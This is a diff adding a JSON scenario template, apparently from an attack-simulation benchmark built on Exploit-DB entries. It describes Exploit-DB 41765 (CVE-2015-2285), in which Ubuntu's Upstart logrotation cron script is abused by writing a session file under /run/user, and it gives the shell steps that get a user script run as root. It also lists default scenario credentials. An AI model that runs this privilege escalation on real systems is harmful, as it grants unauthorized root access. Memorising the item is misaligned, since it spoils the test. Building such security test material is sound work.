@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_41765",
+  "category": "C1_cron",
+  "attack_technique": "T1053.003",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: Ubuntu 15.04 (Development) - 'Upstart' Logrotation Privilege Escalation (CVE-2015-2285)\n\nExploit source code (41765.txt):\n```\nSource: http://www.halfdog.net/Security/2015/UpstartLogrotationPrivilegeEscalation/\n\n## Introduction\n\nProblem description: Ubuntu Vivid 1504 (development branch) installs an insecure upstart logrotation script which will read user-supplied data from /run/user/[uid]/upstart/sessions and pass then unsanitized to an env command. As user run directory is user-writable, the user may inject arbitrary commands into the logrotation script, which will be executed during daily cron job execution around midnight with root privileges.\n\n## Methods\n\nThe vulnerability is very easy to trigger as the logrotation script /etc/cron.daily/upstart does not perform any kind of input sanitation:\n\n\n#!/bin/sh\n\n# For each Upstart Session Init, emit \"rotate-logs\" event, requesting\n# the session Inits to rotate their logs. There is no user-daily cron.\n#\n# Doing it this way does not rely on System Upstart, nor\n# upstart-event-bridge(8) running in the Session Init.\n#\n# Note that system-level Upstart logs are handled separately using a\n# logrotate script.\n\n[ -x /sbin/initctl ] || exit 0\n\nfor session in /run/user/*/upstart/sessions/*\ndo\n    env $(cat $session) /sbin/initctl emit rotate-logs >/dev/null 2>&1 || true\ndone\n\nOn a system with e.g. libpam-systemd installed, standard login on TTY or via SSH will create the directory /run/user/[uid] writable to the user. By preparing a suitable session file, user supplied code will be run during the daily cron-jobs. Example:\n\n\ncat <<EOF > \"${HOME}/esc\"\n#!/bin/sh\ntouch /esc-done\nEOF\nchmod 0755 \"${HOME}/esc\"\n\nmkdir -p /run/user/[uid]/upstart/sessions\necho \"- ${HOME}/esc\" > /run/user/[uid]/upstart/sessions/x\n```",
+  "cve": "CVE-2015-2285",
+  "exploitdb_id": "41765",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_41765",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
